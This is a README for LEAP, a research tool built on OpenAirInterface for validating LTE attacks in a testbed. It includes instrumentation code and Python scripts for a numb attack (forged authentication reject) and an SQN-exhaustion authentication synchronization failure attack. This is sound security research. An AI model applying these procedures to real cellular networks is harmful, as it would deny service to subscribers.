# LTE Evaluation Assistant Platform (LEAP)

LEAP is an extension of [OpenAirInterface Project](https://www.openairinterface.org/) (OAI) for reducing the difficulties of attack validation. It could also help learning of LTE procedure by providing real LTE traffic monitoring.

## Overview

![architecture](https://github.com/pmcrg/LEAP/blob/master/images/architecture.png)

LEAP adopts a Client/Server architecture. The server (LEAP<sub>S</sub>) is coded in C and embedded in OAI. The client (LEAP<sub>C</sub>) is coded by user using leap library provided by this repository. The communication between client and server utilizes two messages LEAP message (LEAP<sub>msg</sub>) and LEAP command (LEAP<sub>cmd</sub>).

When running, LEAP follows the basic pattern below to validate attacks.
1. OAI message is intercepted by probe statement.
2. LEAP<sub>S</sub> generates LEAP<sub>msg</sub> and sends it to LEAP<sub>C</sub>.
3. LEAP<sub>C</sub> parses LEAP<sub>msg</sub>. If LEAP<sub>msg</sub> contains encoded message, it is passed to shared libraries to be decoded. Otherwise it is directly passed to user defined script.
4. LEAP<sub>C</sub> generates LEAP<sub>cmd</sub> according to user defined script and sends to LEAP<sub>S</sub>. Shared libraries may be needed to encode the message during the process. 
5. LEAP<sub>S</sub> parses LEAP<sub>cmd</sub> and calls relevant functions to execute indicated procedures.

## Features

- **Customization of attack layers and procedure:** The layer of the attack is defined by instrumenting OAI. The attack procedure is defined by Python script. LEAP focuses on providing extensive support for both instrumenting OAI and coding the script and does not limit the scope and procedure of the attack.
- **Structure members indexing:** LTE message types are defined in leap/variable_def.py. The definition enables indexing members of LTE message structures using dot operator (e.g. nas\_msg.contents.header.message_type).
- **Decode offloading:** Since message decoding is generally complex, the relevant message decode functions of OAI are extracted and reorganized in leap/src. The files are compiled to shared library and loaded to Python script so as to increase processing speed.
- **Message ID<=>name mapping:** LEAP provides the ID<=>name mapping of LTE and ITTI message. Readable names can be used while coding instead of numerical IDs.


## Installation

### OpenAirInterface

Refer to [official wiki](https://gitlab.eurecom.fr/oai/openairinterface5g/-/wikis/home) to install OpenAirInterface. We recommend a real-world setup in which EPC, eNodeB, and UE are installed on separate machine (example below). Be sure to use the openair-cn folder in our repository to install EPC because LEAP Server is embedded in it.

![setup](https://github.com/pmcrg/LEAP/blob/master/images/setup.png)

### LEAP

LEAP is based python 2 and requires SCTP and ctypes library. If not installed, run:

```sh
pip insall pysctp pysctp3
```

The folder leap/ is a Python library and does not require installation. You only need to compile the offloading shared libraries.

To compile, run:

```sh
cd /path/to/leap/
mkdir build
cd build
cmake ..
```

## Configuration

Modify line 14-29 of leap/func.py to your path of corresponding file. Be sure to use absolute path.

## Run

To run LEAP, you need to first instrument some code in OAI and then code a simple Python script.

### Instrumentation

The instrumentation is for customizing which message you would like to intercept. You can first have a look at Example to know the basics of instrumentation and make your own instrumentation later.

LEAP provides 5 functions for instrumentation. One or more functions can be instrumented at desired place and filled with corresponding arguments. When OAI reaches instrumentation place, the function will be called to send intercepted message to LEAP Client.

#### int leap\_send(int assocfd, uint8\_t message\_id, uint8\_t ue\_id, char \*sendBuf, int size);

Description: Send intercepted message to client and call leap\_loop() to process response from client.

- assocfd: descriptor of SCTP socket
- message\_id: ID of the intercepted message
- ue\_id: the UE which the message belongs to
- sendBuf: address of the intercepted message
- size: size of the intercepted message

#### int leap\_recv(int assocfd, char \*recvBuf, int size, int flag);

Description: Receive message from SCTP socket and process it according to the ID.

- assocfd: descriptor of SCTP socket
- recvBuf: address of the receive buffer
- size: receive size
- flag: reserved

#### int leap\_send\_only(int assocfd, uint8\_t message\_id, uint8\_t ue\_id, char \*sendBuf, int size);

Description: Send intercepted message to client without calling leap\_loop()

- assocfd: descriptor of SCTP socket
- message\_id: ID of the intercepted message
- ue\_id: the UE which the message belongs to
- sendBuf: address of the intercepted message
- size: size of the intercepted message

#### int leap\_recv\_only(int assocfd, char \*recvBuf, int size, int flag);

Description: Receive message from SCTP socket without processing.

- assocfd: descriptor of SCTP socket
- recvBuf: address of the receive buffer
- size: receive size
- flag: reserved

#### leap\_loop()

Description: Calls leap\_recv() repeatedly until the value EXIT\_LOOP is returned.

### Coding Script

The leap folder is a library to assist script coding. It provides the following features.

- Object
  * leap()
    + \_\_init\_\_()
    + send()
    + recv()
    + send\_command()
    + hold()
    + exit\_loop()
    + nas\_message\_decode()
    + emm\_sap\_send\_attach\_reject()
    + send\_authentication\_reject()
    + send\_detach\_request()
    + send\_itti\_dl\_data()
- Functions
  + str\_to\_hex()
  + pointer\_convert()
  + point\_with()
  + point\_str()
  + ppstruct()
- LEAP message ID<=>name mapping
- LEAP command ID<=>name mapping
- LTE/ITTI Message ID<=>name mapping

#### leap()

##### \_\_init\_\_(self, ip, port)

Establish connection with LEAP<sub>S</sub> using designated IP and port.

- ip: IP address of LEAP<sub>S</sub>.
- port: Port of LEAP<sub>S</sub>, "7897" by default.

##### send(self, buf)

Send plain SCTP message to LEAP<sub>S</sub>.

- buf: The string to be sent.

##### recv(self, size)

Receive LEAP<sub>msg</sub> from LEAP<sub>S</sub> and return extracted message_id, ue_id, length, and msg.

- size: Receive size.

##### send\_command(self, command, command\_msg)

Send LEAP<sub>cmd</sub> to LEAP<sub>S</sub>. The command field should be a LEAP<sub>cmd</sub> structure and command\_msg field is the message that will be attached to the message field of LEAP<sub>cmd</sub>. This method could automatically fill the length field of LEAP<sub>cmd</sub> and attach message field to pack a LEAP<sub>cmd</sub>.

- command: Must be a leap\_command\_t() type with command\_id specified.
- command\_msg: The string to be filled in the message field of LEAP<sub>cmd</sub>

##### hold(self, decision)

If decision is True, LEAP<sub>C</sub> sends a HOLD\_TRUE message that causes leap\_send() in LEAP<sub>S</sub> returns 1.

If decision is False, LEAP<sub>C</sub> sends a HOLD\_FALSE message that causes leap\_send() in LEAP<sub>S</sub> returns 0.

Place leap\_send() in a if statement to divert OAI original procedure to custom one. (details in Example section)

- decision: Bool type.

##### exit\_loop(self)

LEAP<sub>C</sub> sends a EXIT\_LEAP\_LOOP message that causes leap\_recv() in LEAP<sub>S</sub> returns -2 and therefore exits the loop initiated by leap\_loop().

##### nas\_message\_decode(self, undecoded\_nas\_msg)

Decode intercepted NAS message.

- undecoded\_nas\_msg: The NAS message received from LEAP<sub>S</sub>.

##### emm\_sap\_send\_attach\_reject(self, ue\_id, emm\_cause)

Send ATTACH\_REJECT to designated UE with specified emm\_cause.

- ue\_id: An integer specifying the UE.
- emm\_cause: Refer to leap/message_def to get ID<=>name mapping.

##### send\_authentication\_reject(self, ue\_id)

Send AUTHENTICATION\_REJECT to designated UE.

- ue\_id: An integer specifying the UE.

##### send\_detach\_request(self, ue\_id)

Send DETACH\_REQUEST to designated UE.

- ue\_id: An integer specifying the UE.

##### send\_itti\_dl\_data(self, ue\_id, nas\_msg)

Send NAS downlink byte stream to designated UE.

- ue\_id: An integer specifying the UE.
- nas\_msg: The byte stream to be sent.

#### Functions

##### str\_to\_hex(s)

Convert string to hex format.

- s: String type.

##### pointer\_convert(original\_variable, new\_type)

Point a LTE message structure with a new pointer type.

- original\_variable: LTE message type.
- new\_type: LTE message type.

##### point\_with(variable, pointer\_type)

Create a pointer of pointer\_type and point it to the variable.

- variable: The variable to point.
- pointer\_type: Type of the pointer. Could be LTE message type

##### point\_str(str\_buf, pointer\_type)

Create a string buffer to store str_buf and return the pointer of the buffer.

- str_buf: Bytes object type
- pointer\_type: Type of the pointer. Could be LTE message type

##### ppstruct(stucture\_to\_print)

Pretty-print LTE message structure.

- stucture\_to\_print: LTE message type

#### LEAP<sub>msg</sub> ID<=>name mapping

LEAP<sub>msg</sub> ID 0-4 are only indication of message interception. It indicates LEAP<sub>S</sub> intercepted corresponding message and only indication rather than the whole message content is sent to LEAP<sub>C</sub>. LEAP<sub>msg</sub> ID 5-6 are information retrieving indication. They are triggered by relevant LEAP<sub>cmd</sub> (LEAP<sub>cmd</sub> ID 2-3). Once LEAP<sub>S</sub> received the LEAP<sub>cmd</sub>, it sent relevant information to LEAP<sub>C</sub> with the whole message carried in the message field

| ID   | Name                                | Description                  |
| ---- | ----------------------------------- | ---------------------------- |
| 0    | LEAP\_ITTI\_MSG                     | ITTI message intercepted (Indication) |
| 1    | LEAP\_INITIAL\_NAS\_DATA            | ATTACH\_REQUEST intercepted (Indication) |
| 2    | LEAP\_EMM\_SAP\_MSG                 | EMM SAP message intercepted (Indication) |
| 3    | LEAP\_SEC\_MODE\_COMMAND\_NAS\_DATA | NAS data of SECURITY\_MODE\_COMMAND intercepted (Indication) |
| 4    | LEAP\_SECURITY\_MODE\_COMMAND       | SECURITY\_MODE\_COMMAND intercepted (Indication) |
| 5    | LEAP\_EMM\_SECURITY\_CTX            | EMM\_SECURITY\_CTX at message field |
| 6    | LEAP\_EMM\_PROC\_COMMON\_GET\_ARGS  | EMM common procedure argument parameters at message field |

#### LEAP<sub>cmd</sub> ID<=>name mapping

| ID   | Name                                      | Description                                      |
| ---- | ----------------------------------------- | ------------------------------------------------ |
| -2   | EXIT\_LEAP\_LOOP                          | Exit leap\_loop() at LEAP<sub>S</sub>            |
| 0    | HOLD\_FALSE                               | Not pause OAI original procedure                 |
| 1    | HOLD\_TRUE                                | Pause OAI original procedure                     |
| 2    | GET\_EMM\_SECURITY\_CONTEXT               | Request EMM\_SECURITY\_CONTEXT                   |
| 3    | GET\_EMM\_PROC\_COMMON\_GET\_ARGS         | Request EMM common procedure argument parameters |
| 4    | SET\_AND\_SEND\_EMM\_ATTACH\_REJECT       | Send downlink ATTACH\_REJECT                     |
| 5    | SET\_AND\_SEND\_AUTHENTICATION\_REJECT    | Send downlink AUTHENTICATION\_REJECT             |
| 6    | SEND\_NETWORK\_INITIATED\_DETACH\_REQUEST | Send downlink DETACH\_REQUEST                    |
| 7    | NAS\_ITTI\_DL\_DATA                       | Send downlink NAS data (byte stream)             |

#### LTE/ITTI Message ID<=>name mapping

Refer to leap/ittimsg\_def to get ITTI Message ID<=>name mapping. ITTI (Inter task interface) is used in OAI to coordinate messages of different tasks. If such messages are to be intercepted, the mapping could be used to use readable names in script instead of IDs.

Refer to leap/message\_def to get LTE Message ID<=>name mapping. LTE message refers to LTE messages of air interface such as ATTACH\_REQUEST. If such messages are to be intercepted, the mapping could be used to use readable names in script instead of IDs.

#### Script Template

This is a template of script. Simply customize the elif section and combines leap methods to perform attack validation.

```python
# Initialization
from leap import *
from leap.message_def import *
from leap.ittimsg_def import *
from leap.leapcommand_def import *
from leap.leapmessage_def import *
from leap.func import *
buf_size = 4096
# Establish connection
le = leap("127.0.0.1", 7897)
while True:
    # Receive LEAPmsg
    message_id, ue_id, length, msg = le.recv(buf_size)
    # Divert OAI execution to custom procedure
    if message_id == LEAP_ITTI_MSG:
        le.hold(True)
    # Customize TODO: add custom handle of intercepted messages
    elif message == ...:
        ...
```


## Examples

### Numb Attack

#### Principle

1. UE sends ATTACH\_REQUEST
2. MME responds with AUTHENTICATION\_FAILURE
3. Attach aborted

#### Method

The operation required is as follows:

1. ATTACH\_REQUEST needs to be intercepted before being processed by MME.
2. Normal attach procedure should be skipped.
3. MME sends AUTHENTICATION\_FAILURE to the UE that initiated the attach.

To achieve this, two leap\_send() is instrumented in MME to intercept ATTACH\_REQUEST. The ATTACH\_REQUEST is then forwarded to LEAP<sub>C</sub>. According to user defined script, LEAP<sub>C</sub> sends a command SET\_AND\_SEND\_AUTHENTICATION\_REJECT to LEAP<sub>S</sub> inside MME. Finally, MME respond with an AUTHENTICATION\_FAILURE.

#### Instrumentation Example

The processing of ATTACH\_REQUEST is located at openair-cn/src/nas/nas\_mme\_task:66. Modify the content of ```case NAS_INITIAL_UE_MESSAGE``` as follows.

```c
nas_establish_ind_t                    *nas_est_ind_p = NULL;
nas_est_ind_p = &received_message_p->ittiMsg.nas_initial_ue_message.nas;
if(leap_send(assocfd, LEAP_ITTI_MSG, nas_est_ind_p->ue_id, received_message_p, sizeof(MessageDef))){
	bstring *nas_msg = NULL;
	nas_msg = &nas_est_ind_p->initial_nas_msg;
	int test_flag = leap_send(assocfd, LEAP_INITIAL_NAS_DATA, nas_est_ind_p->ue_id, (*nas_msg)->data, blength(*nas_msg));
}
else{
	nas_proc_establish_ind (nas_est_ind_p->ue_id,
				nas_est_ind_p->tai,
				nas_est_ind_p->cgi,
				&nas_est_ind_p->initial_nas_msg);
}
```

When OAI executes, LEAP\_ITTI\_MSG indication will be sent to LEAP<sub>C</sub> which will be responded with HOLD\_TRUE. The HOLD\_TRUE causes leap_send() to return 1 which enters if statement, diverting original procedure (nas_proc_establish_ind()) to customized one. Then another leap\_send() intercepts ATTACH\_REQUEST and send it to LEAP<sub>C</sub>.

#### Script Example

The script continuously listens to incoming message from LEAP<sub>S</sub>. According to the instrumentation. It first receives a message with ID LEAP\_ITTI\_MSG. Using le.hold(True), a HOLD\_TRUE is sent to enter if statement at LEAP<sub>S</sub>. Then LEAP\_INITIAL\_NAS\_DATA is received. The NAS message is decoded and message type is extracted to confirm it's ATTACH\_REQUEST. Therefore, the script use le.send\_authentication\_reject(ue\_id) to instruct MME to send an AUTHENTICATION\_REJECT to the UE.

```python
from leap import *
from leap.message_def import *
from leap.ittimsg_def import *
from leap.command_def import *
from leap.leapmessage_def import *
from leap.func import *
buf_size = 4096

le = leap("127.0.0.1","7897")
while True:
	message_id, ue_id, length, msg = le.recv(buf_size)
	if message_id == LEAP_ITTI_MSG:
		le.hold(True)
	elif message_id == LEAP_INITIAL_NAS_DATA:
		nas_msg = le.nas_message_decode(msg)
		message_type = nas_msg.contents.header.message_type
		if message_type == ATTACH_REQUEST:
			le.send_authentication_reject(ue_id)
			le.exit_loop()
	else:
		le.exit_loop()
```
### Authentication Synchronization Failure Attack

#### Principle

1. A malicious UE sends multiple ATTACH\_REQUEST to increase SQN in HSS.
2. Victim UE attaches and receives a Sync failure.

Note: Since HSS only process one ATTACH\_REQUEST if two consecutive ATTACH_REQUEST are the same, the EEA and EIA field of consecutive ATTACH_REQUEST should be modified so that HSS regards them as different ones.

#### Method

In this attack, the malicious UE is simulated by OAI UE and victim UE is a COTS UE. To simulate multiple reception of ATTACH\_REQUEST, a for loop is created in OAI MME. The operation is as follows.

1. Malicious UE sends ATTACH\_REQUEST
2. MME replays the ATTACH\_REQUEST by calling nas_proc_establish_ind 200 times.

The SQN increment is located at openair-cn/src/oai\_hss/db/db\_connector.c:452. The original value is 32. It could be increased to speed up the validation.

#### Instrumentation Example

The instrumentation place is the same as numb attack. The leap\_send() intercepts every ATTACH\_REQUEST. If it returns 1 (malicious UE attach), a for loop is initiated to replay the ATTACH\_REQUEST 200 times and each ATTACH\_REQUEST message is obtained from LEAP<sub>C</sub>. If it returns 0 (victim UE attach) the ATTACH\_REQUEST is processed normally.

```c
if(leap_send(assocfd, LEAP_INITIAL_NAS_DATA, nas_est_ind_p->ue_id, (*nas_msg)->data, blength(*nas_msg))){
    for(int i = 0; i < 200; i++){
        int recv_size = sctp_recvmsg(assocfd, recvBuf, 8192, NULL, NULL, NULL, NULL);
        bstring *modified_nas_msg_p = &(blk2str(recvBuf, blength(*nas_msg)))
        nas_proc_establish_ind (nas_est_ind_p->ue_id,
				nas_est_ind_p->tai,
				nas_est_ind_p->cgi,
				&nas_est_ind_p->initial_nas_msg);
    }
}
else{
	nas_proc_establish_ind (nas_est_ind_p->ue_id,
				nas_est_ind_p->tai,
				nas_est_ind_p->cgi,
				&nas_est_ind_p->initial_nas_msg);
}
```

#### Script Example

When LEAP<sub>C</sub> receives LEAP\_INITIAL\_NAS\_DATA indication, it checks flag variable. As flag equals 0, LEAP<sub>C</sub> sends HOLD\_TRUE so that LEAP<sub>S</sub> enters if clause. Then, LEAP<sub>C</sub> initiates a for loop where it sends ATTACH\_REQUEST 200 times. The EEA and EIA field of each ATTACH\_REQUEST is set to a random value. When victim UE initiates attach, the ATTACH\_REQUEST of Victim UE is also intercepted. Since flag equals 1, LEAP<sub>C</sub> sends HOLD\_FALSE so that LEAP<sub>S</sub> enters else clause and process the ATTACH\_REQUEST normally.

```python
from leap import *
from leap.message_def import *
from leap.ittimsg_def import *
from leap.command_def import *
from leap.leapmessage_def import *
from leap.func import *
import time
import random
buf_size = 4096
le = leap("127.0.0.1","7897")
flag = 0

while True:
	message_id, ue_id, length, msg = le.recv(buf_size)
	if message_id == LEAP_INITIAL_NAS_DATA:
		if flag == 0:
			le.hold(True)
			for y in range(200):
				modified_msg = msg[:13] + chr(0x80>>random.randint(0,7)) + chr(0x80>>random.randint(0,7)) + msg[15:]
				le.send(modified_msg)
			flag = 1
		else:
			le.hold(False)
	else:
        le.exit_loop()
```
